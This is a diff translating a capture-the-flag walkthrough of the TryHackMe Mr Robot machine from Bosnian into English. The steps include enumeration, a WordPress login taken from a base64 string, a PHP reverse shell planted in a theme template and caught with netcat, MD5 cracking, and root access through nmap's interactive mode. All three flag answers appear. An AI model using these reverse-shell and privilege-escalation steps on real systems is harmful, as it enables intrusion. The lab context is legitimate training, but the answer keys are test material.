@@ -19,15 +19,16 @@ tags:
 </p>
 
 
-## Hvala na posjeti!
+## Thanks for visiting!
 
 <img src="/assets/images/mrrobotctf/mrrobot1.png" alt="img" align="right" width="400px">
 
-Da li možemo hakovati Mr Robot CTF ? Ova virtualna mašina je **srednje** težine i naučit će nas mnogo korisnih stvari.
+Can we hack Mr. Robot CTF? This virtual machine is rated **medium** and will teach us many useful things.
 
-Uputstva će vam pomoći da dođete do istih odgovora, tu imate instrukcije korak po korak.
 
-Korišteni programi:
+The instructions will help achieve the same answers; there are step-by-step instructions.
+
+Used programs:
 
 + **OpenVPN** 
 + **NMAP**
@@ -35,32 +36,32 @@ Korišteni programi:
 + **Netcat**
 
 
-## Uputstva
+## Instructions:
 
-Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati na TryHackMe OpenVPN i moramo pokrenuti mašinu u Task 2. 
+To start hacking this virtual machine, we must first connect to TryHackMe OpenVPN and run the machine in Task 2. 
 
-*Pretpostavljam da je vaša lokalna virtualna mašina sa [Kali_Linux](https://www.kali.org/) operativnim sistemom.*
+*I assume your local virtual machine is with the  [Kali_Linux](https://www.kali.org/) operating system.*
 
-1. Konektovanje pomoću **OpenVPN-a**:
+1. Establishing a connection via **OpenVPN-a**:
 
-   Prvo trebamo skinuti [OpenVPN](https://tryhackme.com/access) fajl od TryHackMe-a koji vam oni daju. Zatim upaliti terminal u direktoriji u koju ste skinuli OpenVPN fajl. Konektovanje se radi pomoću:
+   First, we need to download the [OpenVPN](https://tryhackme.com/access) file from TryHackMe that they give you. Then turn on the terminal in the directory where you downloaded the OpenVPN file. Connection is made using:
 
    ```shell
-   sudo openvpn *IME_VAŠEG_FAJLA*.ovpn
+   sudo openvpn *NAME_OF_YOUR_FILE*.ovpn
    ```
 
-2. **Enumeracija mreže**:
+2. **Network enumeration**:
 
-   Prvo šta radimo sa CTF-ovima jeste da pretražimo koji su portovi otvoreni. Što više znamo o sistemu to je bolje. U ovome slučaju koristimo Nmap za skeniranje mreže. 
+   Firstly we need to look at which ports are open. The more we know about the system, the better. In this case, we use Nmap to scan the network. 
 
-   + Nmap skeniranje:
+   + Nmap scan:
 
      ```shell 
-     kali@kali:~/Desktop$ nmap *IP_ADRESA* -A
+     kali@kali:~/Desktop$ nmap *IP_ADDRESS* -A
      ```
      
 
-   + Rezultat Nmap skerniranja:
+   + Result of Nmap scan:
 
      ```shell
      kali@kali:-/Desktop$ nmap 10.10.51.194 -A
@@ -85,16 +86,16 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds
      ```
 
-     Kao što vidimo imamo otvoren port 80 što nam govori da se radi o web stranici na HTTP protokolu.
+     As we can see, we have port 80 open which tells us that this is a website on the HTTP protocol.
 
-   + Instalacija **seclists** liste: 
+   + Installation of **seclists**: 
 
       ```shell
       sudo apt install seclists
       ```
-      Nakon ove komande seclists-e će se instalirati u **/usr/share/seclists/** direktoriju.
+      After this command seclists will be installed in the **/usr/share/seclists/** directory.
 
-   + Enumeracija direktorija na web serveru pomoću **gobuster-a**:
+   + Directory enumeration on a web server using **gobuster-a**:
 
      ```shell
       kali@kali:~/Desktop$ gobuster dir -u http://10.10.51.194/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -163,50 +164,49 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
 
 
 
-3. Ulazak na web stranicu i pronalaženje prvog ključa:
+3. Entering the website and finding the first key:
 
-   Nakon enumeracije možemo vidjeti više direktorija koje se nalaze na ovom web serveru. Ako pogledamo na TryHackMe Hint za prvi ključ možemo vidjeti da nam je hint **robots.txt**. Pretpostavljam da su ovaj hint i **/robots** direktorija povezane. Pored njih zanimljiv mi je **/wp-login** pretpostavljam da je u pitanju Wordpress. 
+   After enumeration, we can see more directories located on this web server. If we look at TryHackMe Hint for the first key, we can see that our hint is **robots.txt**. I guess this hint **/robots** directory are related. Next to them, I'm interested in **/wp-login**; I think it's WordPress.
 
-
-      + Ulazak na stranicu **Ukucajte dobivenu IP adresu u vaš web preglednik**:
+      + Entering the page **Enter the obtained IP address into your web browser**:
 
       <p align="center">
          <img width="100%" src="/assets/images/mrrobotctf/ss1.png" />
       </p>
 
-      + Ali ako ukucamo u naš link **/robots.txt (IP_ADRESA/robots.txt)** možemo vidjeti da nam izbaci prvi ključ, koji se nalazi u .txt formatu. 
+      + But if we type in our link **/robots.txt (IP_ADDRESS/robots.txt)**, we can see that it throws out the first key, which is in .txt format.
       
       <p align="center">
          <img width="100%" src="/assets/images/mrrobotctf/ss2.png" />
       </p>
 
-      - Pronašli smo dva fajla jedan **fsocity.dic i key-1-of-3.txt**. Prvi fajl nam je izgleda dictionary (riječnik) fajl.
+      - We found two files, one **fsociety.dic** and **key-1-of-3.txt**. The first file looks like a dictionary file.
 
-      + Preuzimanje prvog ključa:
+      + First key:
 
-         Prvi ključ možemo vidjeti ulaskom na stranicu (http://IP_ADRESA/key-1-of-3.txt) ali ga možemo i pomoću komande **curl** preuzeti.
+         We can see the first key by entering the page (http://IP_ADDRESS/key-1-of-3.txt), but we can also download it using the **curl** command.
 
          ```shell
-         curl -s http://IP_ADRESA/key-1-of-3.txt
+         curl -s http://IP_ADDRESS/key-1-of-3.txt
          ```
 
-      + Dobiveni ključ:
+      + Result:
 
          ```shell
          kali@kali:~/Desktop$ curl -s http://10.10.51.194/key-1-of-3.txt
 
          073403c8a58a1f80d943455fb30724b9
          ```
-      - **Prvi Ključ:** `073403c8a58a1f80d943455fb30724b9`
+      - **First key:** `073403c8a58a1f80d943455fb30724b9`
 
 
 
 
-4. Pronalaženje drugog ključa:
+4. Finding the second key:
 
    + **HINT:** White coloured text. 
 
-      Ako se vratimo na **gobuster** možemo vidjeti da smo imali **wordpress** direktorije. Specifično me zanimaju: 
+      If we go back to **gobuster** we can see that we had **WordPress** directories. I am specifically interested in:
 
       ```shell
       /login (Status: 302)
@@ -216,17 +216,17 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       /license (Status: 200)
       /wp-includes (Status: 301)
       ```
-      Kao što vidimo **/license** direktorija je sa 200 statusom. Status 200 nam govori da je stranica aktivna. **Curl** nam je najbolji prijatelj u ovome slučaju. 
+      As we can see, the **/license** directory is with 200 status. Status 200 tells us that the page is active. **Curl** is our best friend in this case.
 
 
-   + Curl komanda:
+   + Curl command:
 
       ```shell
-      curl -s http://IP_ADRESA/license | tr -d "\n"
+      curl -s http://IP_ADDRESS/license | tr -d "\n"
       ```
 
 
-   + Dobiveni odgovor: 
+   + Result: 
 
       ```shell
       kali@kali:~/Desktop$ curl -s http://10.10.51.194/license | tr -d "\n"
@@ -235,84 +235,84 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
 
       ZWxsaW90OkVSMjgtMDY1Mgo=
       ```
-      Specifičan tekst je `ZWxsaW90OkVSMjgtMDY1Mgo=` izgleda kao **base64**.
+      The specific text is `ZWxsaW90OkVSMjgtMDY1Mgo=` looks like **base64**.
 
-   + Dekriptovanje **Base64-a**:
+   + Decrypting **Base64**:
 
-      Komanda koju ćemo koristiti je:
+      The command we will use is:
 
       ```shell
       echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
       ```
-      Dobiveni odgovor:
+      Result:
 
       ```shell
       kali@kali:~/Desktop$ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
 
       elliot:ER28-0652
       ```
-   + Dobili smo username i šifru pretpostavljam od wordpress-a. 
+   + We got the username and password, I guess, from WordPress.
    
-      **Zanimljiva činjenica:** Šifra je zapravo referenca na Elliot-ov broj sa identifikacione kartice na poslu i pojavljuje se u seriji.  
+      **Interesting fact:** The code is a reference to Elliot's number from the identification card at work and appears in the series.
 
 
-   + Vrijeme je da se pokušamo prijaviti na worpress. 
+   + It's time to try to sign up on WordPress:
 
-      Prvi korak je da odemo na: 
+      The first step is to go to: 
 
       ```shell
-      http://IP_ADRESA/wp-login
+      http://IP_ADDRESS/wp-login
       ```
 
-   + Nakon prijave na stranici odmah u donjem lijevom uglu možemo vidjeti da je verzija wordpress-a `4.3.1`. Ovo je stara verzija wordpress-a.
+   + After logging in on the page immediately in the lower-left corner, we see that the WordPress version is 4.3.1. This is an old version of WordPress.
 
       <p align="center">
          <img width="100%" src="/assets/images/mrrobotctf/ss3.png" />
       </p>
 
-   + Pronalazimo dva korisnika od kojih Elliot (mi) smo administrator.
+   + We find two users, of which Elliot (we) are the administrator.
 
       <p align="center">
          <img width="100%" src="/assets/images/mrrobotctf/ss4.png" />
       </p>
 
-   + Kao što sam rekao možemo vidjeti da je ova stara verzija wordpress-a ranjiva **PHP reverse shell-ovima.** [**LINK OVE SKRIPTE**](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+   + We can see that this old version of WordPress is vulnerable to **PHP reverse shell-ovima.** [**LINK OF THE SCRIPT**](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
 
-   + Pošto smo administrator potrebno je da odemo u Appearance. 
+   + Since we are an administrator, we need to go to Appearance.
 
       <p align="center">
          <img width="100%" src="/assets/images/mrrobotctf/ss5.png" />
       </p>
 
-   + A nakon toga idemo u Editor i zamjenimo kod sa skriptom za 404 PHP template iz linka gore. 
+   + We have to replace the code with the script on the 404 PHP template. 
 
       <p align="center">
          <img width="100%" src="/assets/images/mrrobotctf/ss6.png" />
       </p>
 
-      **NAPOMENA:** Obratiti pažnju na ip adresu u kodu tu nam ide lokalna IP adresa tj. IP adresa našeg računara. Lokalnu IP Adresu možemo provjeriti sa `ifconfig`. 
+      **Note:** Pay attention to the IP address in the code; here, we have the local IP address, ie. The IP address of our computer. We can check the local IP address with `ifconfig`.
 
-   + Nakon što smo kod zamijenili i promjenili IP adresu u skripti, pokrenut ćemo **netcat** na port-u koji nam piše u skripti. To radimo sljedećom komandom:
+   + After we have replaced and changed the IP address in the script, we will run **Netcat** on the port that establishes a connection to us via the script. We do this with the following command:
 
       ```shell
       nc -nlvp 1234
       ```
 
-   + Nakon toga moramo otići na **http://IP_ADRESA/404.php** ovaj link u web pretraživaču. 
+   + After that, we have to go to the **http://IP_ADDRESS/404.php** this link in the web browser.
 
       <p align="center">
          <img width="100%" src="/assets/images/mrrobotctf/ss7.png" />
       </p>
 
-      Kao što vidimo otvorili smo shell u terminalu. Netcat je dobio konekciju. 
+      As we can see, we opened the shell in the terminal. Netcat got the connection. 
 
-   + Sada ćemo provjeriti koji se fajlovi nalaze u **/home/robot** direktoriji. To radimo pomoću komande: 
+   + We will now check which files are in the **/home/robot** directory. We do this with the command:
 
       ```shell
       ls -l /home/robot
       ```
 
-   + Saznali smo lokaciju drugog ključa: 
+   + We now know the location of the second key: 
 
       ```shell
       $ ls -l /home/robot
@@ -321,55 +321,55 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       -rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
       ```
 
-   + Problem je u tome što mi nismo uopšte `robot` korisnik na ovoj mašini. To provjeravamo komandom `whoami`.
+   + The problem is that we are not `robot` user on this machine at all. We check this with the `whoami` command.
 
       ```shell
       $ whoami
       daemon
       ```
 
-   + Jedini fajl koji možemo vidjeti jeste `password.raw-md5`. Hajmo da vidimo šta ima u ovome fajlu. 
+   + The only file we can see is `password.raw-md5`. Let's see what's in this file. 
 
       ```shell
       $ cat /home/robot/password.raw-md5
       robot:c3fcd3d76192e4007dfb496cca67e13b
       ```
 
-   + MD5 Hash je u pitanju. Kao što znamo hash je matematička funkcija koja nakon što odradi svoj posao se ne može vratiti nazad. Ovo je dobro u smislu čuvanja šifri, ali MD5 je već star algoritam i lagan je da se krekuje. 
+   + It's MD5 Hash. A hash is a mathematical function that cannot be returned after it has done its job. This is good for storing passwords, but MD5 is an old algorithm and easy to crack.
 
-      Da bi uštedili vremena prvo ćemo pogledati da li se ovaj hash može krekovati online. [LINK](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b)
+     We will first look at whether this hash can be cracked online to save time. [LINK](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b)
 
-      Kao što možemo vidjeti na gore navedenom linku, može. **Šifra** je `abcdefghijklmnopqrstuvwxyz`
+      As we can see on the link above, it can. **The password** is `abcdefghijklmnopqrstuvwxyz`
    
-   + Sada se trebamo prijaviti kao `robot` korisnik. To radimo sa komandom:
+   + Now we need to log in as a `robot` user. We do this with the following command:
 
       ```shell
       su - robot
       ```
 
-      Ali nam se pojavi problem: 
+      But there is a problem: 
 
       ```shell
       $ su - robot
       su: must be run from a terminal
       ```
 
-      Ovo možemo popraviti sa Python-om. Prvo ćemo provjeriti da li je python uopšte instaliran. 
+      This can be fixed with Python. Firstly we need to check if  Python is installed at all.
 
       ```shell
       $ which python
       /usr/bin/python
       ```
 
-      Hajmo napraviti shell sa python-om. To radimo ovom komandom. 
+      Let's make a shell with Python. We can do that with this command: 
 
       ```shell
       python -c 'import pty; pty.spawn("/bin/sh")'
       ```
 
-      Kao što možete da vidite nije nam izbacilo nikakavu grešku, što znači da smo uspješno napravili shell u python-u.
+      As you can see, the terminal didn't show any errors, which means that we successfully created a shell in Python.
 
-   + Hajmo se prijaviti kao `robot` korisnik.
+   + Let's sign in as a user `robot`.
 
       ```shell
       $ su - robot           
@@ -382,16 +382,16 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       $ 
       ```
       
-      Kao što vidimo prijavljeni smo kao robot korisnik.
+      As we can see, we are logged in as a `robot` user.
 
-   + **Drugi ključ:** 
+   + **Second key:** 
 
-      Koristimo komandu: 
+      To view the second key, we need to use the cat command: 
 
       ```shell
       cat key-2-of-3.txt
       ```
-      I dobivamo sljedeće:
+      Result:
 
       ```shell
       $ cat key-2-of-3.txt
@@ -399,17 +399,17 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       822c73956184f694993bede3eb39f959
       ```
 
-   + **Drugi ključ:** `822c73956184f694993bede3eb39f959`
+   + **Second key:** `822c73956184f694993bede3eb39f959`
 
    
 
-5. Pronalaženje trećeg ključa:
+5. Finding the third key:
 
    + **HINT:** NMAP
    
-      Ako se vratimo na Nmap rezultat koji smo dobili na početku možemo vidjeti da je SSH port zatvoren. Finalni ključ se većinom nalazi u `/root` direktoriji. Da bismo dobili root, moramo uraditi eskalaciju privilegija. Prva stvar koja me zanima jeste da li se korisnik `robot` nalazi u takozvanim sudo-erima. 
+      If we go back to the Nmap result we got at the beginning; we can see that the SSH port is closed. The final key is mostly located in the `/root` directory. To get root, we need to do a privilege escalation. The first thing that interests me is whether the user `robot` is in the so-called sudo group.
 
-   + Da li je robot u sudo listi ? 
+   + Is user robot in the sudo group ? 
 
       ```shell
       $ sudo -l
@@ -419,11 +419,11 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       Sorry, user robot may not run sudo on linux.
       ```
 
-      Korisnik robot nije u listi sa sudo privilegijama. Sada nam preostaje da vidimo koji programi su pod `root` korisnikom.  
+     The user robot is not on the list with sudo privileges. Now we can see which programs are under the `root` user. 
 
-   + Provjera SETUID-a pod kontrolom root-a:
+   + Checking SETUID that are under root control:
 
-      Komanda: 
+      Command: 
 
       ```shell
       find / -user root -perm -4000 -print 2>/dev/null
@@ -451,11 +451,11 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       /usr/lib/pt_chown
       ```
 
-      Odmah sam primjetio `/usr/local/bin/nmap` hajde da vidimo koja je verzija Nmap-a. 
+      I immediately noticed `/usr/local/bin/nmap`. Let's see what version of Nmap it is.
 
-   + Provjera Nmap verzije: 
+   + Checking Nmap version: 
 
-      Komanda: 
+      Command: 
 
       ```shell 
       nmap --version
@@ -468,13 +468,13 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       nmap version 3.81 ( http://www.insecure.org/nmap/ )
       ```
 
-      Kao što vidimo verzija Nmap-a je **3.81**.
+      As we can see, the Nmap version is **3.81**.
 
-   + Enumeracija:
+   + Enumeration:
 
-      Nakon malo istraživanja pronašao sam: 
+      After a bit of research, I found out: 
 
-      [LINK](https://pentestlab.blog/category/privilege-escalation/) kao što možemo pročitati na gore navedenom linku, ovo je starija Nmap verzija. Verzije od 2.02 do 5.21 su imale tzv. interactive mode (interaktivni mod) koji je dozvoljavao da izvršavamo komande. Pored toga ako provjerimo `SETUID` dozvolja nam da komande pokrećemo kao root. 
+      [LINK](https://pentestlab.blog/category/privilege-escalation/) as we can read at the link above, this is an older Nmap version. Versions from 2.02 to 5.21 had the so-called. The interactive mode allowed us to execute commands. In addition, checking `SETUID` will enable us to run commands as root. 
 
       ```shell
       $ ls -l /usr/local/bin/nmap
@@ -482,10 +482,9 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       -rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
       ```
 
-   + Pokretanje Nmap-a u interaktivnom modu: 
+   + Starting Nmap in the interactive mode: 
 
-      Komanda: 
-
+      Command
       ```shell
       nmap --interactive
       ```
@@ -502,11 +501,11 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       waiting to reap child : No child processes
       ```
 
-      Vidimo da je nmap u interaktivnom modu root. 
+      We see that Nmap is in interactive root mode. 
 
-   + Pronalaženje finalnog ključa: 
+   + Finding the final key: 
 
-      Prvo ćemo provjeriti da li je treći flag u root-u. Komandom:
+      We will first check if the third flag is in the root. Command:
 
       ```shell
       !ls /root
@@ -519,7 +518,7 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       waiting to reap child : No child processes
       ```
       
-      Pronašli smo treći ključ koji je u tekstualnom fajlu. Sadržaj možemo pročitati sljedećom komandom: 
+      We found the third key that is in the text file. We can read the content with the following command:
 
       ```shell
       !cat /root/key-3-of-3.txt
@@ -532,24 +531,23 @@ Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati
       waiting to reap child : No child processes
       ```
 
-   + **Treći Ključ:** `04787ddef27c3dee1ee161b21670b4e4`
+   + **Third key:** `04787ddef27c3dee1ee161b21670b4e4`
 
 
 
-## Zaključak
+## Conclusion
 
-Zanimljiv CTF sa dosta referenci na seriju. Dosta stvari sam naučio, a najbitnije je da redovno updejtujete operativne sisteme i aplikacije, kao što vidimo primjer sa starijom verzijom `nmap-a` i `wordpress-a`. Također ne dozvolite da vam netko hakuje vaše račune, redovno mijenjajte šifre i koristite random šifre minimalne dužine od 32 znamenke za svaki račun. Pravila kojeg bi se svi trebali držati je jedna šifra jedan račun, i jedan račun jedna e-mail adresa.   
+Interesting CTF with a lot of references to the series. I've learned a lot, and the most important thing is to regularly update operating systems and applications, as we see in the example with the older version of `Nmap` and `WordPress`. Also, do not allow anyone to hack your accounts, change the codes regularly and use random codes with a minimum length of 32 digits for each account. Everyone should follow one password, one account, and one email address.
 
+## Keys
 
-## Ključevi
+List of questions and answers:
 
-Lista pitanja i odgovora:
-
-| Pitanja | Odgovori |
+| Questions | Answers |
 | --- | --- |
 | What is key 1 ?  | <kbd> 073403c8a58a1f80d943455fb30724b9 </kbd>|
 | What is key 2 ?  | <kbd> 822c73956184f694993bede3eb39f959 </kbd> |
 | What is key 3 ?  | <kbd> 04787ddef27c3dee1ee161b21670b4e4 </kbd> |
 
-### Hvala puno na vašem vremenu !
+### Thank you so much for your time!
 
